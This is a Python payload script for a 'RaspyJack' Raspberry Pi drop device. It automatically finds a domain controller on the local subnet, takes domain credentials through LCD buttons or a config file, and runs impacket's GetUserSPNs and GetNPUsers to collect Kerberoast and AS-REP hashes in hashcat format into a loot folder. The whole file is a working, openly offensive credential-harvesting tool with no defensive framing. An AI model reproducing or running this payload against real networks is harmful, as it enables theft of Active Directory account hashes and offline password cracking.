#!/usr/bin/env python3
"""
RaspyJack Payload -- Kerberoast & AS-REP Roast
Kerberoasting / AS-REP Roasting via impacket (GetUserSPNs.py, GetNPUsers.py).
Auto-detects DC, collects TGS/AS-REP hashes in hashcat format.
Controls: OK=start, KEY1=toggle mode, KEY3=exit
Loot: /root/Raspyjack/loot/Kerberoast/
"""
import os, sys, json, time, socket, shutil, threading, subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
        "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

LOOT_DIR = "/root/Raspyjack/loot/Kerberoast"
CREDS_PATH = "/root/Raspyjack/config/kerberoast/creds.json"
MODES = ["Kerberoast", "AS-REP Roast"]
DC_PORTS = [88, 389]
SCAN_TIMEOUT = 1.5
ROWS_VISIBLE = 6

os.makedirs(LOOT_DIR, exist_ok=True)

lock = threading.Lock()
status_msg = "Idle"
mode_idx = 0            # 0 = Kerberoast, 1 = AS-REP
scroll_pos = 0
dc_ip = ""
domain = ""
username = ""
password = ""
hashes_found = []       # list of dicts: {account, hash, spn}
attack_running = False
dc_detected = False
spn_count = 0
view_mode = "main"      # main | results


def _find_tool(name):
    """Locate an impacket tool by name. Returns path or None."""
    path = shutil.which(name)
    if path:
        return path
    candidates = [
        f"/usr/bin/{name}",
        f"/usr/local/bin/{name}",
        f"/usr/share/doc/python3-impacket/examples/{name}",
        os.path.expanduser(f"~/.local/bin/{name}"),
    ]
    for c in candidates:
        if os.path.isfile(c):
            return c
    return None


def _impacket_available():
    """Check if core impacket tools exist."""
    return _find_tool("GetUserSPNs.py") is not None


def _load_creds_from_config():
    """Load credentials from JSON config file. Returns (domain, user, pw)."""
    if not os.path.isfile(CREDS_PATH):
        return None, None, None
    try:
        with open(CREDS_PATH, "r") as f:
            data = json.load(f)
        return (
            data.get("domain", ""),
            data.get("username", ""),
            data.get("password", ""),
        )
    except (json.JSONDecodeError, OSError):
        return None, None, None


def _check_port(ip, port, timeout=SCAN_TIMEOUT):
    """Return True if TCP port is open."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            return s.connect_ex((ip, port)) == 0
    except OSError:
        return False


def _get_gateway_subnet():
    """Return the gateway IP and /24 subnet prefix."""
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            if "via" in parts:
                gw = parts[parts.index("via") + 1]
                prefix = ".".join(gw.split(".")[:3])
                return gw, prefix
    except (subprocess.SubprocessError, IndexError, ValueError):
        pass
    return None, None


def _scan_for_dc():
    """Scan local subnet for a Domain Controller (port 88 + 389)."""
    global dc_ip, dc_detected, status_msg

    with lock:
        status_msg = "Scanning for DC..."

    gw, prefix = _get_gateway_subnet()
    if not prefix:
        with lock:
            status_msg = "No network found"
        return

    # Check gateway first (often the DC in lab environments)
    if gw and all(_check_port(gw, p) for p in DC_PORTS):
        with lock:
            dc_ip = gw
            dc_detected = True
            status_msg = f"DC: {gw}"
        return

    # Scan /24 range
    for i in range(1, 255):
        ip = f"{prefix}.{i}"
        if ip == gw:
            continue

        with lock:
            if dc_detected:
                return
            status_msg = f"Scan: {ip}"

        if _check_port(ip, 88, timeout=0.5):
            if _check_port(ip, 389, timeout=0.5):
                with lock:
                    dc_ip = ip
                    dc_detected = True
                    status_msg = f"DC: {ip}"
                return

    with lock:
        status_msg = "No DC found"


def _run_kerberoast_impacket():
    """Run GetUserSPNs.py to extract TGS hashes."""
    global hashes_found, spn_count, status_msg, attack_running

    tool = _find_tool("GetUserSPNs.py")
    if not tool:
        with lock:
            status_msg = "GetUserSPNs not found"
            attack_running = False
        return

    with lock:
        target_dc = dc_ip
        dom = domain
        user = username
        pw = password

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    outfile = os.path.join(LOOT_DIR, f"hashes_{ts}.txt")

    with lock:
        status_msg = "Running GetUserSPNs..."

    try:
        result = subprocess.run(
            [
                "python3", tool,
                f"{dom}/{user}:{pw}",
                "-dc-ip", target_dc,
                "-request",
                "-outputfile", outfile,
            ],
            capture_output=True, text=True, timeout=120,
        )
    except subprocess.TimeoutExpired:
        with lock:
            status_msg = "Timeout (2min)"
            attack_running = False
        return
    except OSError as exc:
        with lock:
            status_msg = f"Err: {str(exc)[:18]}"
            attack_running = False
        return

    _parse_impacket_output(result.stdout, result.stderr, outfile)

    with lock:
        attack_running = False


def _parse_impacket_output(stdout, stderr, outfile):
    """Parse GetUserSPNs output and hash file."""
    global hashes_found, spn_count, status_msg

    parsed = []

    # Count SPNs from stdout
    count = 0
    for line in stdout.splitlines():
        stripped = line.strip()
        if stripped and not stripped.startswith("Impacket") and "/" in stripped:
            count += 1

    # Parse output hash file
    if os.path.isfile(outfile):
        try:
            with open(outfile, "r") as f:
                for line in f:
                    line = line.strip()
                    if line.startswith("$krb5tgs$"):
                        parts = line.split("$")
                        account = parts[3] if len(parts) > 3 else "unknown"
                        spn_name = parts[4] if len(parts) > 4 else ""
                        parsed.append({
                            "account": account,
                            "hash": line,
                            "spn": spn_name[:40],
                        })
        except OSError:
            pass

    with lock:
        hashes_found = parsed
        spn_count = max(count, len(parsed))
        if parsed:
            status_msg = f"Got {len(parsed)} TGS hashes"
        elif "error" in stderr.lower():
            err_line = stderr.strip().splitlines()[-1] if stderr.strip() else "Error"
            status_msg = f"Err: {err_line[:20]}"
        else:
            status_msg = "No SPN accounts found"


def _run_asrep_impacket():
    """Run GetNPUsers.py to find accounts without pre-auth."""
    global hashes_found, spn_count, status_msg, attack_running

    tool = _find_tool("GetNPUsers.py")
    if not tool:
        with lock:
            status_msg = "GetNPUsers not found"
            attack_running = False
        return

    with lock:
        target_dc = dc_ip
        dom = domain
        user = username
        pw = password

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    outfile = os.path.join(LOOT_DIR, f"hashes_{ts}.txt")

    with lock:
        status_msg = "Running GetNPUsers..."

    try:
        result = subprocess.run(
            [
                "python3", tool,
                f"{dom}/{user}:{pw}",
                "-dc-ip", target_dc,
                "-request",
                "-format", "hashcat",
                "-outputfile", outfile,
            ],
            capture_output=True, text=True, timeout=120,
        )
    except subprocess.TimeoutExpired:
        with lock:
            status_msg = "Timeout (2min)"
            attack_running = False
        return
    except OSError as exc:
        with lock:
            status_msg = f"Err: {str(exc)[:18]}"
            attack_running = False
        return

    _parse_asrep_output(result.stdout, result.stderr, outfile)

    with lock:
        attack_running = False


def _parse_asrep_output(stdout, stderr, outfile):
    """Parse GetNPUsers output and hash file."""
    global hashes_found, spn_count, status_msg

    parsed = []

    if os.path.isfile(outfile):
        try:
            with open(outfile, "r") as f:
                for line in f:
                    line = line.strip()
                    if line.startswith("$krb5asrep$"):
                        parts = line.split("$")
                        account = parts[3] if len(parts) > 3 else "unknown"
                        # Strip @domain from account
                        if "@" in account:
                            account = account.split("@")[0]
                        parsed.append({
                            "account": account,
                            "hash": line,
                            "spn": "NO_PREAUTH",
                        })
        except OSError:
            pass

    with lock:
        hashes_found = parsed
        spn_count = len(parsed)
        if parsed:
            status_msg = f"Got {len(parsed)} AS-REP hashes"
        elif "error" in stderr.lower():
            err_line = stderr.strip().splitlines()[-1] if stderr.strip() else "Error"
            status_msg = f"Err: {err_line[:20]}"
        else:
            status_msg = "No vulnerable accounts"


def _save_summary():
    """Save a JSON summary of the attack results."""
    with lock:
        data = {
            "timestamp": datetime.now().isoformat(),
            "mode": MODES[mode_idx],
            "dc_ip": dc_ip,
            "domain": domain,
            "username": username,
            "spn_count": spn_count,
            "hashes_captured": len(hashes_found),
            "accounts": [
                {"account": h["account"], "spn": h["spn"]}
                for h in hashes_found
            ],
        }

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"roast_{ts}.json")
    try:
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    except OSError:
        pass
    return path


def _run_attack():
    """Run the selected attack mode."""
    global attack_running, status_msg

    with lock:
        if attack_running:
            return
        attack_running = True

    with lock:
        current_mode = mode_idx

    if current_mode == 0:
        _run_kerberoast_impacket()
    else:
        _run_asrep_impacket()

    # Save summary after attack completes
    with lock:
        has_hashes = len(hashes_found) > 0

    if has_hashes:
        _save_summary()


LCD_KB_CHARS = (
    "abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "0123456789"
    ".\\-_/@!#$%"
)


def _lcd_input(prompt, max_len=40, is_password=False):
    """Collect text input from the user via LCD + buttons."""
    buf = []
    char_idx = 0

    while True:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.rectangle((0, 0, 127, 13), fill="#111")
        d.text((2, 1), prompt[:20], font=font, fill="#CC44FF")

        display_val = "*" * len(buf) if is_password else "".join(buf)
        d.text((2, 20), display_val[-20:], font=font, fill="white")

        current_char = LCD_KB_CHARS[char_idx % len(LCD_KB_CHARS)]
        d.text((2, 38), f"Char: {current_char}", font=font, fill="#FFAA00")
        d.rectangle((0, 54, 127, 55), fill="#333")
        d.text((2, 60), "U/D:char OK:add", font=font, fill="#888")
        d.text((2, 74), "RIGHT:done LEFT:del", font=font, fill="#888")
        d.text((2, 90), f"Len: {len(buf)}/{max_len}", font=font, fill="#666")

        LCD.LCD_ShowImage(img, 0, 0)

        btn = get_button(PINS, GPIO)
        if btn == "UP":
            char_idx = (char_idx - 1) % len(LCD_KB_CHARS)
            time.sleep(0.15)
        elif btn == "DOWN":
            char_idx = (char_idx + 1) % len(LCD_KB_CHARS)
            time.sleep(0.15)
        elif btn == "OK":
            if len(buf) < max_len:
                buf.append(LCD_KB_CHARS[char_idx % len(LCD_KB_CHARS)])
            time.sleep(0.2)
        elif btn == "LEFT":
            if buf:
                buf.pop()
            time.sleep(0.2)
        elif btn == "RIGHT":
            return "".join(buf)
        elif btn == "KEY3":
            return ""
        time.sleep(0.05)


def _prompt_credentials():
    """Ask user for domain, username, password via LCD or load from config."""
    global domain, username, password, status_msg

    # Try config file first
    cfg_dom, cfg_user, cfg_pw = _load_creds_from_config()
    if cfg_dom and cfg_user and cfg_pw:
        with lock:
            domain = cfg_dom
            username = cfg_user
            password = cfg_pw
            status_msg = "Creds loaded from cfg"
        return True

    # Manual LCD input
    dom = _lcd_input("DOMAIN (e.g. corp.local)")
    if not dom:
        return False
    user = _lcd_input("USERNAME")
    if not user:
        return False
    pw = _lcd_input("PASSWORD", is_password=True)
    if not pw:
        return False

    with lock:
        domain = dom
        username = user
        password = pw
        status_msg = "Creds set"
    return True


def _draw_header(d):
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "KERBEROAST", font=font, fill="#CC44FF")
    with lock:
        running = attack_running
    color = "#00FF00" if running else "#FF4444"
    d.ellipse((118, 3, 122, 7), fill=color)


def _draw_footer(d, text):
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), text[:24], font=font, fill="#AAA")


def draw_main_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d)

    with lock:
        msg = status_msg
        mode = MODES[mode_idx]
        detected = dc_detected
        target_dc = dc_ip
        has_creds = bool(domain and username)
        running = attack_running
        h_count = len(hashes_found)

    y = 18
    d.text((2, y), f"Mode: {mode}", font=font, fill="#FFAA00")
    y += 14

    dc_color = "#00FF00" if detected else "#FF4444"
    dc_label = target_dc if detected else "Scanning..."
    d.text((2, y), f"DC: {dc_label}", font=font, fill=dc_color)
    y += 14

    cred_color = "#00FF00" if has_creds else "#FF4444"
    cred_label = f"{domain}\\{username}" if has_creds else "Not set"
    d.text((2, y), f"Cred: {cred_label[:18]}", font=font, fill=cred_color)
    y += 14

    impacket_ok = _impacket_available()
    imp_color = "#00FF00" if impacket_ok else "#FF4444"
    imp_label = "Yes" if impacket_ok else "No"
    d.text((2, y), f"Impacket: {imp_label}", font=font, fill=imp_color)
    y += 14

    if running:
        d.text((2, y), msg[:22], font=font, fill="#00CCFF")
    elif h_count > 0:
        d.text((2, y), f"Hashes: {h_count}", font=font, fill="#00FF00")
    else:
        d.text((2, y), msg[:22], font=font, fill="#888")

    _draw_footer(d, "OK:Go K1:Mode K3:Exit")
    LCD.LCD_ShowImage(img, 0, 0)


def draw_results_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d)

    with lock:
        hashes = list(hashes_found)
        sc = scroll_pos
        mode = MODES[mode_idx]

    d.text((2, 16), f"{mode}: {len(hashes)} hashes", font=font, fill="#FFAA00")

    if not hashes:
        d.text((10, 50), "No hashes captured", font=font, fill="#666")
    else:
        visible = hashes[sc:sc + ROWS_VISIBLE]
        for i, h in enumerate(visible):
            y = 30 + i * 14
            acct = h["account"][:14]
            spn = h["spn"][:10] if h["spn"] else ""
            d.text((2, y), f"{acct}", font=font, fill="#CC44FF")
            d.text((80, y), spn, font=font, fill="#888")

    _draw_footer(d, f"U/D:Scrl K3:Back")
    LCD.LCD_ShowImage(img, 0, 0)


def main():
    global mode_idx, scroll_pos, view_mode, status_msg

    # Splash screen
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((14, 12), "KERBEROAST", font=font, fill="#CC44FF")
    d.text((4, 32), "TGS & AS-REP hash", font=font, fill="#888")
    d.text((4, 44), "extraction tool", font=font, fill="#888")
    d.text((4, 64), "OK = Start attack", font=font, fill="#666")
    d.text((4, 76), "K1 = Toggle mode", font=font, fill="#666")
    d.text((4, 88), "K3 = Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(0.5)

    # Auto-detect DC in background
    threading.Thread(target=_scan_for_dc, daemon=True).start()

    try:
        while True:
            btn = get_button(PINS, GPIO)

            if view_mode == "main":
                if btn == "KEY3":
                    break

                if btn == "KEY1":
                    with lock:
                        mode_idx = (mode_idx + 1) % len(MODES)
                    time.sleep(0.25)

                elif btn == "OK":
                    with lock:
                        running = attack_running
                        detected = dc_detected

                    if running:
                        time.sleep(0.2)
                    elif not detected:
                        with lock:
                            status_msg = "No DC detected yet"
                        time.sleep(0.2)
                    else:
                        # Ensure credentials are set
                        with lock:
                            has_creds = bool(domain and username)
                        if not has_creds:
                            if not _prompt_credentials():
                                with lock:
                                    status_msg = "Creds cancelled"
                                time.sleep(0.2)
                                draw_main_view()
                                continue

                        if not _impacket_available():
                            with lock:
                                status_msg = "Impacket required!"
                            time.sleep(0.2)
                        else:
                            threading.Thread(
                                target=_run_attack, daemon=True
                            ).start()
                    time.sleep(0.2)

                elif btn == "UP":
                    with lock:
                        if hashes_found:
                            view_mode = "results"
                            scroll_pos = 0
                    time.sleep(0.25)

                draw_main_view()

            elif view_mode == "results":
                if btn == "KEY3":
                    with lock:
                        view_mode = "main"
                        scroll_pos = 0
                    time.sleep(0.25)
                elif btn == "UP":
                    with lock:
                        scroll_pos = max(0, scroll_pos - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    with lock:
                        scroll_pos = min(
                            max(0, len(hashes_found) - ROWS_VISIBLE),
                            scroll_pos + 1,
                        )
                    time.sleep(0.15)

                draw_results_view()

            time.sleep(0.05)

    finally:
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
